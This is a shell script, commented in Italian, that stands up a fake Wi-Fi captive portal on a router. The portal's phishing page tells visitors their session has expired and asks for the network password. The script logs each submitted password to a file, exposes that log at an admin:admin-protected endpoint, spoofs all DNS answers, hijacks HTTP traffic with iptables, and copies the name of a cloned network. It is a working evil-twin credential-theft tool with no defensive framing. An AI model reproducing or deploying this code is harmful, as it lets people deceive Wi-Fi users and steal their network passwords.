#!/bin/sh
# Captive Portal via inetd (no CGI needed)
P=/tmp/portal; R=192.168.0.1; LAN=br0
SSID=$(nvram get ssid 2>/dev/null || nvram get wl0_ssid 2>/dev/null || cat /tmp/portal_ssid 2>/dev/null || echo WiFi)
echo "$SSID" > /tmp/portal_ssid
mkdir -p $P

# --- Template portale (con placeholder __SSID__, sostituito ad ogni richiesta) ---
cat > $P/template.html << 'ENDHTML'
<!DOCTYPE html><html lang=it><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Autenticazione Wi-Fi</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,Helvetica,sans-serif;background:#eef1f7;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:16px}header{margin-bottom:18px;text-align:center}header span{font-size:20px;font-weight:700;color:#0055b3;letter-spacing:-.3px}header small{display:block;font-size:11px;color:#888;margin-top:2px}.card{background:#fff;border:1px solid #d8dde8;border-radius:6px;padding:28px 24px;max-width:380px;width:100%;box-shadow:0 2px 6px rgba(0,0,0,.07)}.icon{text-align:center;margin-bottom:14px}h1{font-size:16px;color:#1a1a1a;text-align:center;margin-bottom:6px;font-weight:700}.ssid-row{text-align:center;margin-bottom:14px}.ssid{display:inline-block;background:#f0f5ff;border:1px solid #bfd0f5;border-radius:3px;padding:3px 10px;font-size:14px;font-weight:700;color:#0044aa;max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.msg{font-size:12px;color:#555;line-height:1.55;margin-bottom:18px;text-align:center;border-top:1px solid #eee;padding-top:14px}label{display:block;font-size:11px;font-weight:700;color:#333;margin-bottom:4px;text-transform:uppercase;letter-spacing:.4px}input[type=password]{width:100%;padding:10px 11px;border:1px solid #ccc;border-radius:4px;font-size:14px;color:#222;outline:none;margin-bottom:14px}input[type=password]:focus{border-color:#0055b3;box-shadow:0 0 0 2px rgba(0,85,179,.1)}button{width:100%;padding:11px;background:#0055b3;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:700;cursor:pointer}button:hover{background:#004499}.note{font-size:11px;color:#888;margin-top:12px;text-align:center;line-height:1.5}footer{margin-top:20px;font-size:10px;color:#aaa;text-align:center}footer a{color:#0055b3;text-decoration:none}</style></head><body><header><span>&#x1F4F6;&nbsp;Portale Wi-Fi</span><small>Accesso sicuro alla rete</small></header><div class=card><div class=icon><svg width=50 height=38 viewBox="0 0 50 38" fill=none><path d="M1 13C9 4 17 0 25 0s16 4 24 13" stroke=#0055b3 stroke-width=3 stroke-linecap=round/><path d="M7 20C13 13 19 10 25 10s12 3 18 10" stroke=#0055b3 stroke-width=3 stroke-linecap=round/><path d="M13 27c4-5 8-7 12-7s8 2 12 7" stroke=#0055b3 stroke-width=3 stroke-linecap=round/><circle cx=25 cy=35 r=3 fill=#0055b3/></svg></div><h1>Autenticazione richiesta</h1><div class=ssid-row><span class=ssid>__SSID__</span></div><p class=msg>La tua sessione &egrave; scaduta o il dispositivo deve essere autenticato.<br>Inserisci la password della rete Wi-Fi per continuare.</p><form action=/connect method=POST><label>Password Wi-Fi</label><input type=password name=p placeholder="Chiave di rete" required autofocus><button type=submit>Accedi alla rete</button><p class=note>La connessione &egrave; protetta e crittografata.</p></form></div><footer><a href=#>Termini di utilizzo</a> &bull; <a href=#>Privacy</a> &bull; &copy; Portale Wi-Fi</footer></body></html>
ENDHTML

# --- HTTP handler (eseguito da inetd per ogni connessione) ---
cat > /tmp/http_handler.sh << 'ENDHANDLER'
#!/bin/sh
ud(){ printf '%b' "$(echo "$1"|sed 's/+/ /g;s/%\([0-9a-fA-F][0-9a-fA-F]\)/\\x\1/g')";}

# Leggi request line
read -r LINE
METHOD=$(echo "$LINE"|cut -d' ' -f1)
FULLPATH=$(echo "$LINE"|cut -d' ' -f2)
RPATH=$(echo "$FULLPATH"|cut -d'?' -f1)
QS=$(echo "$FULLPATH"|grep -o '?.*'|cut -c2-)

# Leggi headers, cattura Content-Length e Authorization
CLEN=0; AUTH=""
while read -r HDR; do
    HDR=$(echo "$HDR"|tr -d '\r')
    [ -z "$HDR" ] && break
    case "$(echo "$HDR"|cut -d: -f1|tr A-Z a-z)" in
        content-length)  CLEN=$(echo "$HDR"|cut -d: -f2|tr -d ' ');;
        authorization)   AUTH=$(echo "$HDR"|cut -d' ' -f3);;
    esac
done

# Leggi body POST
BODY=""
[ "$METHOD" = "POST" ] && [ "$CLEN" -gt 0 ] 2>/dev/null && \
    BODY=$(dd bs=1 count=$CLEN 2>/dev/null)

SUCCESS='<!DOCTYPE html><html lang=it><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=refresh content="3;url=http://www.google.com"><title>Accesso effettuato</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,Helvetica,sans-serif;background:#eef1f7;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:16px}header{margin-bottom:18px;text-align:center}header span{font-size:20px;font-weight:700;color:#0055b3;letter-spacing:-.3px}header small{display:block;font-size:11px;color:#888;margin-top:2px}.card{background:#fff;border:1px solid #d8dde8;border-radius:6px;padding:36px 28px;max-width:340px;width:100%;box-shadow:0 2px 6px rgba(0,0,0,.07);text-align:center}.icon{width:56px;height:56px;background:#f0faf4;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}h1{font-size:17px;color:#1a1a1a;margin-bottom:8px;font-weight:700}p{font-size:12px;color:#666;line-height:1.6}.bar{height:3px;background:#eee;border-radius:2px;margin-top:20px;overflow:hidden}.bar-fill{height:100%;background:#0055b3;border-radius:2px;animation:fill 3s linear forwards}@keyframes fill{from{width:0}to{width:100%}}footer{margin-top:20px;font-size:10px;color:#aaa;text-align:center}footer a{color:#0055b3;text-decoration:none}</style></head><body><header><span>&#x1F4F6;&nbsp;Portale Wi-Fi</span><small>Accesso sicuro alla rete</small></header><div class=card><div class=icon><svg width=28 height=28 viewBox="0 0 28 28" fill=none><path d="M5 14l7 7 11-11" stroke=#22a85a stroke-width=2.5 stroke-linecap=round stroke-linejoin=round/></svg></div><h1>Autenticazione completata</h1><p>Sei stato autenticato con successo.<br>Verrai reindirizzato a breve&hellip;</p><div class=bar><div class=bar-fill></div></div></div><footer><a href=#>Termini di utilizzo</a> &bull; <a href=#>Privacy</a> &bull; &copy; Portale Wi-Fi</footer></body></html>'

# admin:admin in base64
ADMIN_B64="YWRtaW46YWRtaW4="

case "$RPATH" in
    /connect)
        W=$(ud "$(echo "$BODY"|sed -n 's/.*\bp=\([^&]*\).*/\1/p')")
        printf '[%s] ip=%s ssid=%s pass=%s\n' \
            "$(date '+%F %T')" "${REMOTE_ADDR:-?}" "$(cat /tmp/portal_ssid 2>/dev/null)" "$W" >> /tmp/creds.log
        printf 'HTTP/1.0 200 OK\r\nContent-Type: text/html\r\nContent-Length: %d\r\n\r\n%s' \
            "${#SUCCESS}" "$SUCCESS"
        ;;
    /creds|/cgi-bin/creds.cgi|/admin/creds)
        # Richiede Basic Auth admin:admin
        if [ "$AUTH" != "$ADMIN_B64" ]; then
            MSG="Accesso non autorizzato."
            printf 'HTTP/1.0 401 Unauthorized\r\nWWW-Authenticate: Basic realm="Admin"\r\nContent-Type: text/plain\r\nContent-Length: %d\r\n\r\n%s' \
                "${#MSG}" "$MSG"
        else
            BODY=$(cat /tmp/creds.log 2>/dev/null || echo 'Nessuna credenziale catturata.')
            printf 'HTTP/1.0 200 OK\r\nContent-Type: text/plain\r\nContent-Length: %d\r\n\r\n%s' \
                "${#BODY}" "$BODY"
        fi
        ;;
    /set_ssid)
        # Aggiorna SSID del portal (chiamato dal cloner JS, CORS non necessario)
        S=$(ud "$(echo "$QS"|sed -n 's/.*\bs=\([^&]*\).*/\1/p')")
        [ -n "$S" ] && echo "$S" > /tmp/portal_ssid
        printf 'HTTP/1.0 200 OK\r\nAccess-Control-Allow-Origin: *\r\nContent-Type: text/plain\r\nContent-Length: 2\r\n\r\nok'
        ;;
    *)
        # Serve il template con SSID corrente sostituito ad ogni richiesta
        SSID=$(cat /tmp/portal_ssid 2>/dev/null || echo WiFi)
        SSID_ESC=$(printf '%s' "$SSID" | sed 's/[&\/]/\\&/g')
        PAGE=$(sed "s/__SSID__/$SSID_ESC/g" /tmp/portal/template.html)
        printf 'HTTP/1.0 200 OK\r\nContent-Type: text/html\r\nContent-Length: %d\r\n\r\n%s' \
            "${#PAGE}" "$PAGE"
        ;;
esac
ENDHANDLER
chmod +x /tmp/http_handler.sh

# --- inetd config per porta 8080 ---
echo '8080 stream tcp nowait root /tmp/http_handler.sh http_handler.sh' > /tmp/inetd_portal.conf
inetd /tmp/inetd_portal.conf

# --- DNS spoofing ---
echo "* $R" > /tmp/dnsd.conf
kill $(pidof dnsd) 2>/dev/null
dnsd -c /tmp/dnsd.conf -i $R &

# --- iptables ---
iptables -t nat -F CAPTIVE 2>/dev/null; iptables -t nat -X CAPTIVE 2>/dev/null
iptables -t nat -N CAPTIVE
iptables -t nat -A CAPTIVE -s $R -j RETURN
iptables -t nat -A CAPTIVE -p tcp --dport 80  -j DNAT --to $R:8080
iptables -t nat -A CAPTIVE -p udp --dport 53  -j DNAT --to $R:53
iptables -t nat -A CAPTIVE -p tcp --dport 53  -j DNAT --to $R:53
iptables -t nat -A PREROUTING -i $LAN -j CAPTIVE
